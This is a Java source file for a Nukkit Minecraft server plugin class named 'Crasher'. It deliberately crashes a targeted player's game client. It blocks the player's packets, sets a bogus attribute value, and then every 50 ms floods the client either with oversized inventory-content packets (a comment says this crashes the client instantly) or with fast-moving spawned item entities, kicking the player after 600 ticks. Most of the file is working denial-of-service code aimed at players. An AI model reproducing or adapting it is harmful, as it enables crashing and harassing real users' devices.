package me.liuli.cc;

import cn.nukkit.Player;
import cn.nukkit.entity.Attribute;
import cn.nukkit.item.Item;
import cn.nukkit.level.GlobalBlockPalette;
import cn.nukkit.network.protocol.AddItemEntityPacket;
import cn.nukkit.network.protocol.InventoryContentPacket;
import cn.nukkit.network.protocol.UpdateAttributesPacket;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class Crasher {
    private static String[] nameBase = "Air,Stone,Granite,Diorite,Andesite,GrassBlock,Dirt,CoarseDirt,Podzol,Cobblestone,OakPlanks,BirchPlanks,OakSapling,Bedrock,Sand,RedSand,Gravel,GoldOre,IronOre,CoalOre,OakLog,SpruceLog,BirchLog,JungleLog,AcaciaLog,DarkOakLog,OakLeaves,BirchLeaves,Sponge,WetSponge,Glass,LapisOre,LapisBlock,Dispenser,Sandstone,NoteBlock,PoweredRail,Cobweb,Grass,Fern,DeadBush,Piston,WhiteWool,OrangeWool,MagentaWool,YellowWool,LimeWool,PinkWool,GrayWool,CyanWool,PurpleWool,BlueWool,BrownWool,GreenWool,RedWool,BlackWool,Dandelion,Poppy,BlueOrchid,Allium,AzureBluet,RedTulip,OrangeTulip,WhiteTulip,PinkTulip,OxeyeDaisy,Cornflower,WitherRose,RedMushroom,SugarCane,GoldBlock,IronBlock,OakSlab,SpruceSlab,BirchSlab,JungleSlab,AcaciaSlab,DarkOakSlab,StoneSlab,BrickSlab,QuartzSlab,Bricks,Tnt,Bookshelf,Obsidian,Torch,EndRod,ChorusPlant,PurpurBlock,Spawner,OakStairs,Chest,DiamondOre,Farmland,Furnace,Ladder,Rail,Lever,RedstoneOre,Snow,Ice,SnowBlock,Cactus,Clay,Jukebox,OakFence,SpruceFence,BirchFence,JungleFence,AcaciaFence,Pumpkin,Netherrack,SoulSand,SoulSoil,Glowstone,OakTrapdoor,StoneBricks,IronBars,Chain,GlassPane,Melon,Vine,BrickStairs,Mycelium,LilyPad,EndStone,DragonEgg,EmeraldOre,EnderChest,BirchStairs,Beacon,StoneButton,OakButton,BirchButton,Anvil,Hopper,QuartzBlock,Dropper,Barrier,HayBlock,WhiteCarpet,LimeCarpet,PinkCarpet,GrayCarpet,CyanCarpet,BlueCarpet,BrownCarpet,GreenCarpet,RedCarpet,BlackCarpet,Terracotta,CoalBlock,PackedIce,SlimeBlock,GrassPath,Sunflower,Lilac,RoseBush,Peony,TallGrass,LargeFern,Prismarine,SeaLantern,MagmaBlock,BoneBlock,Observer,ShulkerBox,RedConcrete,BlueIce,IronDoor,OakDoor,SpruceDoor,BirchDoor,JungleDoor,AcaciaDoor,DarkOakDoor,Repeater,Comparator,Apple,Bow,Arrow,Coal,Charcoal,Diamond,IronIngot,GoldIngot,WoodenSword,WoodenAxe,WoodenHoe,StoneSword,StoneShovel,StoneAxe,StoneHoe,GoldenSword,GoldenAxe,GoldenHoe,IronSword,IronShovel,IronPickaxe,IronAxe,IronHoe,DiamondAxe,DiamondHoe,Stick,Bowl,String,Feather,Gunpowder,WheatSeeds,Wheat,Bread,IronHelmet,IronBoots,GoldenBoots,Flint,Porkchop,Painting,GoldenApple,OakSign,SpruceSign,BirchSign,JungleSign,AcaciaSign,DarkOakSign,Bucket,WaterBucket,LavaBucket,Minecart,Saddle,Redstone,Snowball,OakBoat,Leather,MilkBucket,CodBucket,Brick,ClayBall,Paper,Book,SlimeBall,Egg,Compass,FishingRod,Clock,Cod,Salmon,Pufferfish,CookedCod,InkSac,CocoaBeans,LapisLazuli,WhiteDye,OrangeDye,MagentaDye,YellowDye,LimeDye,PinkDye,GrayDye,CyanDye,PurpleDye,BrownDye,GreenDye,RedDye,BoneMeal,Bone,Sugar,Cake,WhiteBed,OrangeBed,MagentaBed,YellowBed,LimeBed,PinkBed,GrayBed,CyanBed,PurpleBed,BlueBed,BrownBed,GreenBed,RedBed,BlackBed,Cookie,FilledMap,Shears,MelonSlice,MelonSeeds,Beef,CookedBeef,Chicken,RottenFlesh,EnderPearl,BlazeRod,GhastTear,GoldNugget,NetherWart,Potion,GlassBottle,SpiderEye,BlazePowder,MagmaCream,Cauldron,EnderEye,BatSpawnEgg,BeeSpawnEgg,CatSpawnEgg,CodSpawnEgg,CowSpawnEgg,FoxSpawnEgg,PigSpawnEgg,VexSpawnEgg,FireCharge,WrittenBook,Emerald,ItemFrame,FlowerPot,Carrot,Potato,BakedPotato,Map,ZombieHead,PlayerHead,CreeperHead,NetherStar,PumpkinPie,NetherBrick,Quartz,TntMinecart,Rabbit,RabbitStew,RabbitFoot,RabbitHide,ArmorStand,Lead,NameTag,Mutton,WhiteBanner,LimeBanner,PinkBanner,GrayBanner,CyanBanner,BlueBanner,BrownBanner,GreenBanner,RedBanner,BlackBanner,EndCrystal,ChorusFruit,Beetroot,TippedArrow,Shield,Elytra,SpruceBoat,BirchBoat,JungleBoat,AcaciaBoat,DarkOakBoat,IronNugget,MusicDisc".split(",");
    private static Item[] items = new Item[]{ new Item(298, 0), new Item(302, 0), new Item(306, 0),
            new Item(310, 0), new Item(314, 0), new Item(301, 0), new Item(305, 0),
            new Item(309, 0), new Item(313, 0), new Item(317, 0), new Item(299, 0),
            new Item(303, 0), new Item(307, 0), new Item(311, 0), new Item(315, 0),
            new Item(300, 0), new Item(304, 0), new Item(308, 0), new Item(312, 0),
            new Item(316, 0)};


    private final Timer timer;
    private final Player player;
    private int count = 0;
    private final CrashMode mode;
    public float multiplier = 1.0F;

    public Crasher(Player player,CrashMode mode) {
        this.player = player;
        this.mode=mode;
        PacketBlockManager.addBlock(player);
        sendData();

        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                crashTick();
            }
        }, 50, 50);
    }

    private static String nameGen() {
        String name = nameBase[Utils.randInt(0, nameBase.length - 1)];
        name += Utils.randInt(0, 999);
        return name;
    }

    private void sendData() {
        UpdateAttributesPacket packet = new UpdateAttributesPacket();
        packet.entityId = player.getId();
        packet.entries = new Attribute[]{Attribute.getAttribute(5).clone().setValue(114514F)};
        packet.frame = 0;
        player.dataPacket(packet);
    }

    private void crashTick() {
        if (player.isOnline()) {
            if (count >= 600) {
                player.kick();
            }
            count++;

            switch (mode){
                case INVENTORY:{
                    //it will crash client instantly :sadface:
                    for(int i=0;i<(multiplier+1);i++) {
                        InventoryContentPacket inventoryContentPacket = new InventoryContentPacket();
                        inventoryContentPacket.inventoryId = 0;
                        ArrayList<Item> itemArr = new ArrayList<>();
                        for (int j = 0; j < 36; j++) {
                            itemArr.add(randomItem());
                        }
                        inventoryContentPacket.slots = itemArr.toArray(new Item[0]);
                        player.dataPacket(inventoryContentPacket);
                    }
                    break;
                }
                case MOTION:{
                    AddItemEntityPacket addItemEntityPacket=new AddItemEntityPacket();
                    long id=Utils.randInt(10000, 1000000);
                    addItemEntityPacket.entityRuntimeId=id;
                    addItemEntityPacket.entityUniqueId=id;
                    addItemEntityPacket.item=randomItem();
                    addItemEntityPacket.x= (float) player.x;
                    addItemEntityPacket.y= (float) player.y;
                    addItemEntityPacket.z= (float) player.z;
                    addItemEntityPacket.isFromFishing=true;
                    addItemEntityPacket.speedX= (float) Utils.randDouble(-0.5,0.5);
                    addItemEntityPacket.speedY=Utils.randInt(30,70)*multiplier;
                    addItemEntityPacket.speedZ=(float) Utils.randDouble(-0.5,0.5);
                    player.dataPacket(addItemEntityPacket);
                }
            }

        } else {
            timer.cancel();
        }
    }

    private Item randomItem() {
        return items[Utils.randInt(0,items.length-1)];
    }

    private int randomBlock() {
        int id = Utils.randInt(1, 150);
        return GlobalBlockPalette.getOrCreateRuntimeId(id, 0);
    }
}
